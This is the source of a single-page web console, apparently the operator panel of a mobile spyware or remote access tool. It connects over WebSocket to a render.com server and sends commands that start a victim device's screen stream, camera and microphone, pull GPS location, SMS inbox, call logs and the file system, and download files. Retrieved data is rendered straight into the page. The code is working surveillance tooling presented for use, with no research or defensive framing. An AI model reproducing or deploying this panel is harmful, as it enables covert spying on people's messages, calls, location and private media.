<!DOCTYPE html>
<html>
<head>
<title>SystemSync Elite Console</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>

body{
    margin:0;
    background:#f4f6fb;
    font-family:Segoe UI;
    display:flex;
    height:100vh;
}

/* ===== SIDEBAR ===== */

#sidebar{
    width:270px;
    background:#ffffff;
    border-right:1px solid #e2e6ef;
    padding:18px;
    overflow-y:auto;
}

.logo{
    font-size:20px;
    font-weight:700;
    color:#1976ff;
    margin-bottom:20px;
}

.section-title{
    font-size:11px;
    color:#8892a7;
    margin:18px 0 6px;
    text-transform:uppercase;
}

/* ===== BUTTONS ===== */

button{
    width:100%;
    padding:10px;
    border-radius:8px;
    border:1px solid #dfe3ec;
    background:#fff;
    cursor:pointer;
    margin-bottom:6px;
    text-align:left;
    transition:.2s;
}

button:hover{
    background:#1976ff;
    color:#fff;
}

/* ===== MAIN ===== */

#main{
    flex:1;
    display:flex;
    flex-direction:column;
}

#header{
    height:60px;
    background:#fff;
    border-bottom:1px solid #e2e6ef;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 25px;
    font-weight:600;
}

#status{
    padding:6px 12px;
    border-radius:20px;
    background:#ffebee;
    color:#d32f2f;
}

/* ===== SINGLE PANEL ===== */

#panel{
    flex:1;
    margin:20px;
    background:#fff;
    border-radius:14px;
    box-shadow:0 8px 25px rgba(0,0,0,.05);
    overflow:auto;
    padding:20px;
}

/* VIDEO */

video,img{
    width:100%;
    max-height:75vh;
    object-fit:contain;
}

/* TABLE */

table{
    width:100%;
    border-collapse:collapse;
}

th,td{
    padding:10px;
    border-bottom:1px solid #eef1f6;
    font-size:14px;
}

th{
    background:#f7f9fc;
    text-align:left;
}

/* FILE GRID */

.file{
    padding:10px;
    border-bottom:1px solid #eef1f6;
    cursor:pointer;
}

.file:hover{
    background:#f1f5ff;
}

/* PAGINATION */

.pagination{
    margin-top:10px;
    display:flex;
    gap:6px;
}

.pageBtn{
    padding:6px 10px;
    border:1px solid #d0d7e2;
    background:#fff;
    cursor:pointer;
}

.pageBtn:hover{
    background:#1976ff;
    color:#fff;
}

</style>
</head>

<body>

<!-- SIDEBAR -->

<div id="sidebar">

<div class="logo">SystemSync</div>

<div class="section-title">Surveillance</div>

<button onclick="startScreen()">üñ• Start Screen</button>
<button onclick="send('STOP_SCREEN_SHARE')">‚èπ Stop Screen</button>

<button onclick="send('camFront')">üì∑ Start Front Camera</button>
<button onclick="send('stopCam')">‚èπ Stop Camera</button>

<button onclick="send('startAudio')">üé§ Start Mic</button>
<button onclick="send('stopAudio')">‚èπ Stop Mic</button>

<button onclick="send('getLocation')">üìç GPS</button>

<div class="section-title">Data</div>

<button onclick="send('ls root')">üìÇ File Manager</button>
<button onclick="send('getSMS inbox')">üí¨ SMS Logs</button>
<button onclick="send('getCallLogs')">üìû Call Logs</button>

</div>

<!-- MAIN -->

<div id="main">

<div id="header">
Elite Control Panel
<div id="status">CONNECTING</div>
</div>

<div id="panel">
Ready.
</div>

</div>

<script>

const WS_URL = "wss://mirror-view.onrender.com";

let ws;
let pc;
let currentData=[];
let currentPage=0;

const panel = document.getElementById("panel");

/* ==========================
   CONNECT
========================== */

function connect(){

ws = new WebSocket(WS_URL);

ws.onopen=()=>{
    ws.send("I_AM_WEB");
    setStatus("ONLINE");
};

ws.onclose=()=>{
    setStatus("OFFLINE");
    setTimeout(connect,4000);
};

ws.onmessage=(e)=>{

const msg = e.data;

if(msg.startsWith("SMS_DATA:"))
    renderTable(JSON.parse(msg.substring(9)));

else if(msg.startsWith("CALL_DATA:"))
    renderTable(JSON.parse(msg.substring(10)));

else if(msg.startsWith("FILE_LIST:"))
    renderFiles(JSON.parse(msg.substring(10)));

else if(msg.startsWith("CAMERA_IMAGE:"))
    showImage(msg.substring(13));

else if(msg.startsWith("RTC_OFFER:screen:"))
    handleOffer(msg.substring(17));

};

}

function setStatus(s){
const el=document.getElementById("status");

el.innerText=s;
el.style.background = s==="ONLINE" ? "#e8f5e9" : "#ffebee";
}

/* ==========================
   COMMAND
========================== */

function send(cmd){
if(ws.readyState===1)
    ws.send(cmd);
}

/* ==========================
   SINGLE PANEL RENDERERS
========================== */

function showImage(base64){

panel.innerHTML=
`<img src="data:image/jpeg;base64,${base64}">`;

}

/* TABLE WITH PAGINATION */

function renderTable(data){

currentData=data;
currentPage=0;

drawTable();

}

function drawTable(){

const start=currentPage*20;
const rows=currentData.slice(start,start+20);

let html="<table><tr>";

Object.keys(rows[0]).forEach(k=>{
html+=`<th>${k}</th>`;
});

html+="</tr>";

rows.forEach(r=>{
html+="<tr>";
Object.values(r).forEach(v=>{
html+=`<td>${v}</td>`;
});
html+="</tr>";
});

html+="</table>";

/* pagination */

html+=`<div class="pagination">`;

for(let i=0;i<Math.ceil(currentData.length/20);i++){
html+=`<button class="pageBtn" onclick="gotoPage(${i})">${i+1}</button>`;
}

html+="</div>";

panel.innerHTML=html;

}

function gotoPage(p){
currentPage=p;
drawTable();
}

/* FILE EXPLORER */

function renderFiles(files){

let html="<h3>File Explorer</h3>";

files.forEach(f=>{

html+=`
<div class="file"
onclick="send('${f.isDir?'ls ':'dl '}${f.path}')">
${f.isDir?'üìÅ':'üìÑ'} ${f.name}
</div>`;

});

panel.innerHTML=html;

}

/* ==========================
   WEBRTC
========================== */

async function startScreen(){

panel.innerHTML="<h2>Waiting for screen...</h2>";

send("START_SCREEN_SHARE");

}

function handleOffer(sdp){

if(!pc){

pc=new RTCPeerConnection({
iceServers:[{urls:"stun:stun.l.google.com:19302"}]
});

pc.ontrack=(e)=>{
panel.innerHTML=
'<video autoplay playsinline id="v"></video>';

document.getElementById("v")
.srcObject=e.streams[0];
};

pc.onicecandidate=(e)=>{
if(e.candidate)
ws.send("ICE_CANDIDATE:"+JSON.stringify(e.candidate));
};

}

pc.setRemoteDescription({
type:'offer',
sdp:sdp
})
.then(()=>pc.createAnswer())
.then(a=>pc.setLocalDescription(a))
.then(()=>{
ws.send("ANSWER:"+pc.localDescription.sdp);
});

}

/* ========================== */

connect();

</script>
</body>
</html>
